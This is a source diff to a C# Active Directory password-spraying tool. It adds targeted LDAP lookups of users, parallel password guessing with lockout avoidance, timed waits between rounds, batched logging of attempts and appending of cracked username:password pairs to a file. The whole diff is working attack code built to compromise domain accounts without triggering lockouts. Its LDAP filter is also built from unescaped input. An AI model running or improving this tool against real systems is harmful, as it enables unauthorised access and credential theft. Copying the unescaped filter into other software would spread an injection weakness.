@@ -8,6 +8,10 @@ using System.Linq;
 using TheSprayer.Helpers;
 using System.Threading.Tasks;
 using System.Threading;
+using System.Security.Principal;
+using System.Text;
+using System.Collections.Concurrent;
+using System.IO;
 
 namespace TheSprayer.Services
 {
@@ -141,27 +145,44 @@ namespace TheSprayer.Services
 
         // This class uses the System.DirectoryServices.Protocols namespace to retrieve domain users over LDAP. 
         // There are other options that are easier to work with but this one was chosen because it's the only one that is cross platform.
-        public List<ActiveDirectoryUser> GetAllDomainUsers()
+        public List<ActiveDirectoryUser> GetAllDomainUsers(IEnumerable<string> userSamAccountNames = null)
         {
             var adUsers = new List<ActiveDirectoryUser>();
 
             int pageCount = 0;
             // Get specific attributes. There's a heap that aren't relevant and when there are tons of users it will lessen the load on the DC
             string[] attributes = { "userPrincipalName", "sAMAccountName", "distinguishedName", "givenName", "sn", "description", "lastLogon", "badPwdCount", "badPasswordTime", "logonCount", "pwdLastSet", "accountExpires", "createTimeStamp", "ADsPath", "company", "objectSid", "sIDHistory", "adminDescription", "msDS-ResultantPSO", "userAccountControl" };
-            
-            // LDAP Filter to get all domain users. This needs to be modified but works for testing.
-            string filter = "(&(objectCategory=person)(objectClass=user))";
+
+            // Construct LDAP filter based on whether we have a list of specific users
+            string filter;
+            if (userSamAccountNames != null && userSamAccountNames.Any())
+            {
+                // Build an OR clause for each user in the list using their sAMAccountName
+                var userFilterBuilder = new StringBuilder();
+                userFilterBuilder.Append("(|");
+                foreach (var name in userSamAccountNames)
+                {
+                    userFilterBuilder.AppendFormat("(sAMAccountName={0})", name);
+                }
+                userFilterBuilder.Append(")");
+                filter = "(&(objectCategory=person)(objectClass=user)" + userFilterBuilder.ToString() + ")";
+            }
+            else
+            {
+                // LDAP Filter to get all domain users
+                filter = "(&(objectCategory=person)(objectClass=user))";
+            }
 
             // Initiate a new LDAP connection.
-            var connection = CreateLdapConnection();            
+            var connection = CreateLdapConnection();
             SearchRequest searchRequest = new(_distinguishedName,
                                       filter,
                                       SearchScope.Subtree,
                                       attributes);
 
-            // set the size of the page results. This is a heavy operation for domain controllers so paging is necessary.
-            PageResultRequestControl prc = new(500);
-            SearchOptionsControl so = new(SearchOption.DomainScope);
+            // Set the size of the page results. This is a heavy operation for domain controllers so paging is necessary.
+            PageResultRequestControl prc = new(5000);
+            SearchOptionsControl so = new(System.DirectoryServices.Protocols.SearchOption.DomainScope);
             searchRequest.Controls.Add(prc);
             searchRequest.Controls.Add(so);
 
@@ -171,20 +192,25 @@ namespace TheSprayer.Services
                 {
                     pageCount++;
                     SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);
-                    //find the returned page response control - http://dunnry.com/blog/PagingInSystemDirectoryServicesProtocols.aspx
+
+                    // Find the returned page response control and update the LDAP cookie for the next set
                     foreach (DirectoryControl control in searchResponse.Controls)
                     {
                         if (control is PageResultResponseControl resultControl)
                         {
-                            //update the LDAP cookie for next set
+                            // Update the page request control with the new cookie to continue paging
                             prc.Cookie = resultControl.Cookie;
                             break;
                         }
                     }
 
-                    // Loop through every response
+                    // Loop through every response entry
                     foreach (SearchResultEntry entry in searchResponse.Entries)
                     {
+                        var sid = entry.Attributes.Contains("objectSid") && entry.Attributes["objectSid"].Count > 0
+                            ? new SecurityIdentifier((byte[])entry.Attributes["objectSid"][0], 0).Value
+                            : null;
+
                         adUsers.Add(new ActiveDirectoryUser()
                         {
                             UserPrincipalName = entry.Attributes.GetIfExists("userPrincipalName"),
@@ -203,7 +229,7 @@ namespace TheSprayer.Services
                             PasswordPolicyName = entry.Attributes.GetIfExists("msDS-ResultantPSO") ?? "Default Password Policy",
                             ADsPath = entry.Attributes.GetIfExists("ADsPath"),
                             Company = entry.Attributes.GetIfExists("company"),
-                            ObjectSid = entry.Attributes.GetIfExists("objectSid"),
+                            ObjectSid = sid,
                             SidHistory = entry.Attributes.GetIfExists("sIDHistory"),
                             AdminDescription = entry.Attributes.GetIfExists("adminDescription"),
                             Disabled = !IsUserActive(entry.Attributes.GetIfExists<int>("userAccountControl"))
@@ -213,7 +239,7 @@ namespace TheSprayer.Services
             }
             catch (Exception e)
             {
-                Console.WriteLine("\nUnexpected exception occured:\n\t{0}: {1}", e.GetType().Name, e.Message);
+                Console.WriteLine("\nUnexpected exception occurred:\n\t{0}: {1}", e.GetType().Name, e.Message);
             }
 
             return adUsers;
@@ -225,26 +251,29 @@ namespace TheSprayer.Services
         }
 
         public void SprayPasswords(
-            IEnumerable<string> passwords, IEnumerable<string> usersToSpray = null, int attemptsToLeave = 2, 
-            string outputFile = null, bool continuous = false, bool noDb = false, bool force = false //TODO: Implement continuous
-        )
+    IEnumerable<string> passwords,
+    IEnumerable<string> usersToSpray = null,
+    int attemptsToLeave = 2,
+    string outputFile = null,
+    bool continuous = false,
+    bool noDb = false,
+    bool force = false
+)
         {
             var defaultPasswordPolicy = GetPasswordPolicy();
             var fineGrainedPasswordPolicies = GetFineGrainedPasswordPolicy();
-            var users = GetAllDomainUsers();
-            
-            //Filter users down to the list passed in (if any)
+            var users = GetAllDomainUsers(usersToSpray);
+
             if (usersToSpray != null)
             {
-                users = users.Where(u => usersToSpray.Any(u2 => u2.ToLower() == u.SamAccountName.ToLower())).ToList();
+                users = users.Where(u => usersToSpray.Any(u2 => u2.Equals(u.SamAccountName, StringComparison.OrdinalIgnoreCase))).ToList();
                 if (!users.Any())
                 {
-                    Console.WriteLine("No users, exiting!");
+                    Console.WriteLine("No users found that match the specified criteria, exiting!");
                     return;
                 }
             }
 
-            //Filter down the list of users
             List<ActiveDirectoryUser> filteredUsers = new();
             if (force)
             {
@@ -253,7 +282,7 @@ namespace TheSprayer.Services
             }
             else
             {
-                Console.WriteLine("Filtering disabled and nearly locked users...");
+                Console.WriteLine("Filtering out disabled and nearly locked users...");
                 foreach (var user in users)
                 {
                     if (ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
@@ -263,101 +292,131 @@ namespace TheSprayer.Services
                 }
             }
 
-            //Get the previous attempts for these users, we don't want to double-spray passwords
             Dictionary<string, List<CredentialAttempt>> previousSprays = new();
             if (!noDb)
             {
                 previousSprays = _sqlService.GetSprayAttemptsForUsers(filteredUsers.Select(u => u.SamAccountName));
             }
-            foreach (var password in passwords)
-            {
-                //If we have no more users, don't continue
-                if (filteredUsers.Count == 0)
-                {
-                    Console.Write($"{users.Count} users found but they are all at risk of lockout, ");
-                    if (!continuous)
-                    {
-                        Console.WriteLine("exiting.");
-                        return;
-                    }
-                    else
-                    {
-                        Console.WriteLine($"waiting {defaultPasswordPolicy.ObservationWindow} minutes before retrying to prevent lockout.");
-                        Thread.Sleep(TimeSpan.FromMinutes((int)(defaultPasswordPolicy.ObservationWindow + 0.5))); //Rounded up to prevent trying a minute early, just in case
 
-                        //Reset the password attempts since we know it's 0 for everyone on the default policy now (excluding user error, but I'm sure it's fine)
-                        foreach (var user in users.Where(u => u.PasswordPolicyName == "Default Password Policy" && !u.Disabled))
+            var unsavedAttempts = new ConcurrentBag<CredentialAttempt>();
+
+            // Timer to trigger database save every 10 seconds
+            var cancellationTokenSource = new CancellationTokenSource();
+            var saveTask = Task.Run(async () =>
+            {
+                while (!cancellationTokenSource.Token.IsCancellationRequested)
+                {
+                    await Task.Delay(TimeSpan.FromSeconds(10));
+                    SaveUnsavedAttempts(unsavedAttempts, noDb);
+                }
+            }, cancellationTokenSource.Token);
+
+            try
+            {
+                foreach (var password in passwords)
+                {
+                    if (!filteredUsers.Any())
+                    {
+                        Console.Write($"{users.Count} users found but they are all at risk of lockout, ");
+                        if (!continuous)
                         {
-                            user.BadPasswordAttempts = 0;
-                            filteredUsers.Add(user);
+                            Console.WriteLine("exiting.");
+                            break;
+                        }
+                        else
+                        {
+                            Console.WriteLine($"waiting {defaultPasswordPolicy.ObservationWindow} minutes before retrying to prevent lockout.");
+                            Thread.Sleep(TimeSpan.FromMinutes((int)(defaultPasswordPolicy.ObservationWindow + 0.5)));
+
+                            foreach (var user in users.Where(u => u.PasswordPolicyName == "Default Password Policy" && !u.Disabled))
+                            {
+                                user.BadPasswordAttempts = 0;
+                                filteredUsers.Add(user);
+                            }
+                        }
+                    }
+
+                    var successfulCredentials = new ConcurrentBag<(string SamAccountName, string Password)>();
+                    var usersToRemove = new ConcurrentBag<string>();
+
+                    Console.WriteLine($"Trying password \"{password}\" against {filteredUsers.Count} of {users.Count} user{(users.Count > 1 ? "s" : "")}...");
+                    Parallel.ForEach(
+                        filteredUsers,
+                        new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount },
+                        user =>
+                        {
+                            if (!noDb && previousSprays.ContainsKey(user.SamAccountName))
+                            {
+                                var previousAttempt = previousSprays[user.SamAccountName].FirstOrDefault(a => a.Password == password);
+                                if (previousAttempt != null)
+                                {
+                                    if (previousAttempt.Success)
+                                    {
+                                        ColorConsole.WriteLine($"{user.SamAccountName}:{password} (Found in database)");
+                                    }
+                                    return;
+                                }
+                            }
+
+                            if (TryValidateCredentials(user.SamAccountName, password))
+                            {
+                                ColorConsole.WriteLine($"{user.SamAccountName}:{password}");
+                                successfulCredentials.Add((user.SamAccountName, password));
+                                unsavedAttempts.Add(new CredentialAttempt(user.SamAccountName, password, true));
+                            }
+                            else
+                            {
+                                unsavedAttempts.Add(new CredentialAttempt(user.SamAccountName, password, false));
+                                user.BadPasswordAttempts++;
+                                user.LastBadPasswordTime = DateTime.Now;
+
+                                if (!ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
+                                {
+                                    usersToRemove.Add(user.SamAccountName);
+                                }
+                            }
+                        }
+                    );
+
+                    filteredUsers = filteredUsers.Where(u => !usersToRemove.Contains(u.SamAccountName)).ToList();
+
+                    if (!string.IsNullOrWhiteSpace(outputFile) && successfulCredentials.Count > 0)
+                    {
+                        lock (outputFile)
+                        {
+                            using var sw = new StreamWriter(outputFile, append: true);
+                            foreach (var credential in successfulCredentials)
+                            {
+                                sw.WriteLine($"{credential.SamAccountName}:{credential.Password}");
+                            }
                         }
                     }
                 }
-
-                //Try the current password
-                Console.WriteLine($"Trying password {password} against {filteredUsers.Count} of {users.Count} user{(users.Count > 1 ? "s" : "")}...");
-                Parallel.ForEach(
-                    filteredUsers.ToList(), 
-                    new ParallelOptions { MaxDegreeOfParallelism = 1000 }, 
-                    user =>
-                    {
-                        //Skip user if they've previously been sprayed according to the db
-                        if (previousSprays.ContainsKey(user.SamAccountName))
-                        {
-                            var previousAttempt = previousSprays[user.SamAccountName].FirstOrDefault(a => a.Password == password);
-                            if (previousAttempt != null) 
-                            {
-                                if (previousAttempt.Success)
-                                {
-                                    ColorConsole.WriteLine($"{user.SamAccountName}:{password} (Found in database)");
-                                }
-                                return;
-                            }
-                        }
-
-                        //Test the credentials
-                        if (TryValidateCredentials(user.SamAccountName, password))
-                        {
-                            ColorConsole.WriteLine($"{user.SamAccountName}:{password}");
-                            if (!string.IsNullOrWhiteSpace(outputFile))
-                            {
-                                //Avoid simultaniously editing the file and losing results
-                                lock (outputFile)
-                                {
-                                    using var sw = System.IO.File.CreateText(outputFile);
-                                    sw.WriteLine($"{user.SamAccountName}:{password}");
-                                }
-                            }
-
-                            if (!noDb)
-                            {
-                                lock (_dbLock)
-                                {
-                                    _sqlService.SaveCredentialPair(user.SamAccountName, password, true);
-                                }
-                            }
-                        }
-                        else //Increment users bad password attempts and remove if close to lockout
-                        {
-                            if (!noDb)
-                            {
-                                lock (_dbLock)
-                                {
-                                    _sqlService.SaveCredentialPair(user.SamAccountName, password, false);
-                                }
-                            }
-
-                            user.BadPasswordAttempts++;
-                            user.LastBadPasswordTime = DateTime.Now;
-                            if (!ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
-                            {
-                                filteredUsers.Remove(user);
-                            }
-                        }
-                    }
-                );
+            }
+            finally
+            {
+                cancellationTokenSource.Cancel();
+                saveTask.Wait();
+                SaveUnsavedAttempts(unsavedAttempts, noDb);
             }
         }
+
+        private void SaveUnsavedAttempts(ConcurrentBag<CredentialAttempt> unsavedAttempts, bool noDb)
+        {
+            if (noDb) return;
+
+            var attemptsToSave = new List<CredentialAttempt>();
+            while (unsavedAttempts.TryTake(out var attempt))
+            {
+                attemptsToSave.Add(attempt);
+            }
+
+            if (attemptsToSave.Any())
+            {
+                _sqlService.BulkSaveCredentialPairs(attemptsToSave);
+            }
+        }
+
 
         public static bool ShouldSprayUser(ActiveDirectoryUser user, PasswordPolicy defaultPasswordPolicy, List<PasswordPolicy> fineGrainedPasswordPolicies, int attemptsToLeave = 2)
         {
